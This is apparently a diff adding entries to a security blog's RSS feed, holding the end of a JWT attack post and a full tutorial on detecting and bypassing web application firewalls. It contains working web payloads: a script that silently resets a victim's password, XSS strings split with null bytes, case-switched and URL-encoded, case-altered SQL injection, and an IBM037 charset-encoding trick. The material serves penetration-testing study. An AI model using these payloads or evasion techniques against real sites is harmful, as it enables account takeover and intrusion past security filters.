+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;newpass&amp;#34;:&amp;#34;BadGuyKnowsThis!&amp;#34;}&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;34---man-in-the-middle&#34;&gt;3.4 - Man-in-the-Middle&lt;/h3&gt;
+&lt;p&gt;JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Bypassing WAFs</title>
+      <link>https://flowhero.github.io/newblog/posts/bypassing-wafs/</link>
+      <pubDate>Sat, 05 Aug 2023 00:15:21 +0100</pubDate>
+      
+      <guid>https://flowhero.github.io/newblog/posts/bypassing-wafs/</guid>
+      <description>I - Toolkits nmap http-waf-detect wafw00f ffuf wfuzz IP Rotate Burp Extension II - Detecting WAF We get detected by : IP address, origin headers, authorization tokens, and metadata. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.
+Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended.</description>
+      <content>&lt;h2 id=&#34;i---toolkits&#34;&gt;I - Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nmap&lt;/code&gt;  http-waf-detect&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wafw00f&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ffuf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wfuzz&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;IP Rotate&lt;/code&gt; Burp Extension&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ii---detecting-waf&#34;&gt;II - Detecting WAF&lt;/h2&gt;
+&lt;p&gt;We get detected by :
+&lt;em&gt;IP address&lt;/em&gt;, &lt;em&gt;origin&lt;/em&gt; &lt;strong&gt;headers&lt;/strong&gt;, &lt;em&gt;authorization tokens&lt;/em&gt;, and &lt;em&gt;metadata&lt;/em&gt;. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended. That way, you should have a chance to understand the app’s functionality before getting into trouble. You could, for example, review documentation or build out a collection of valid requests and then map out the API as a valid user.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;A &lt;em&gt;302&lt;/em&gt; &lt;em&gt;response&lt;/em&gt; that forwards you to a CDN&lt;/li&gt;
+&lt;li&gt;Using &lt;em&gt;nmap&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -p &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; –script http-waf-detect http://hapihacker.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Using &lt;em&gt;Wafw00f&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wafw00f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;target&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Paying attention to &lt;em&gt;headers&lt;/em&gt; such as &lt;em&gt;X-CDN&lt;/em&gt;,&lt;em&gt;CDNs&lt;/em&gt; provide a way to reduce latency globally by caching the API pro-
+vider’s requests. ,  CDNs will often provide WAFs as a service
+&lt;strong&gt;X-CDN&lt;/strong&gt;: akamai
+&lt;strong&gt;X-CDN&lt;/strong&gt;: Incapsula
+&lt;strong&gt;X-Kong-Proxy-Latency&lt;/strong&gt;: 123
+&lt;strong&gt;Server&lt;/strong&gt;: Zenedge
+&amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iii---evasing-waf&#34;&gt;III - Evasing WAF&lt;/h2&gt;
+&lt;h3 id=&#34;1----null-bytes&#34;&gt;1 -  Null Bytes&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Could terminate the API security control filters that may be in place.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If the null byte is processed by a backend program thatvalidates user input, that validation program could be bypassed because itstops processing the input.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;string terminators you can use&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Can be placed in &lt;strong&gt;different parts&lt;/strong&gt; of the request to attempt to bypass any restrictions in place,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%00cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%00cript&amp;gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;--&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;We&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;even&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;it&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;than&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;once&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;same&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;place&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%000000cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%000000cript&amp;gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wordlist&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;~/tools/SecLists&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;-2023.2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Fuzzing/Metacharacters.fuzzdb.txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2---case-switching&#34;&gt;2 - Case Switching&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;sCriPt&amp;gt;alert(&amp;#39;supervuln&amp;#39;)&amp;lt;/scrIpT&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;SeLeCT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RoM&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;all_tables&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;sELecT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@@vErSion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3----encoding&#34;&gt;3 -  Encoding&lt;/h3&gt;
+&lt;p&gt;When encoding, focus on the characters that may be blocked, such as
+these:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; [ ] { } &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You could either encode part of a payload or encode all&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cscript%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;supervuln%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;fscript&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert(&amp;#39;supervuln&amp;#39;)%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;f%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;11---charset-encoding&#34;&gt;1.1 - Charset Encoding&lt;/h4&gt;
+&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Charset encoding&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded;charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037,boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##Python code&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quote_plus(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IBM037&amp;#34;&lt;/span&gt;))) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## Request example&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: buggy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Type: application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm500
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;KKaKKa&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C6&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;D3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C1&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C7K&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;L&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4---automation-wburp-intruder--wfuzz&#34;&gt;4 - Automation w/&lt;em&gt;Burp Intruder&lt;/em&gt; &amp;amp; &lt;em&gt;Wfuzz&lt;/em&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Intruder&lt;/em&gt; -&amp;gt; &lt;em&gt;Payloads&lt;/em&gt;, &lt;strong&gt;Payload Processing Option&lt;/strong&gt; allows you to add rules that Burp will apply to each payload before it is sent.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Let&amp;rsquo;s say we can bypass WAF by The following rule , we can apply it then start fuzzing for passwords or whatso&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Rules are applied from &lt;strong&gt;TOP&lt;/strong&gt; to &lt;strong&gt;BOTTOM&lt;/strong&gt; , in this example , suffix and prefix are added after encoding so they are not encoded.
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_004051.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Wfuzz&lt;/code&gt; &lt;a href=&#34;https://wfuzz.readthedocs.io/en/latest/user/advanced.html#iterators-combining-payloads&#34;&gt;Usage&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List encoding methods:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
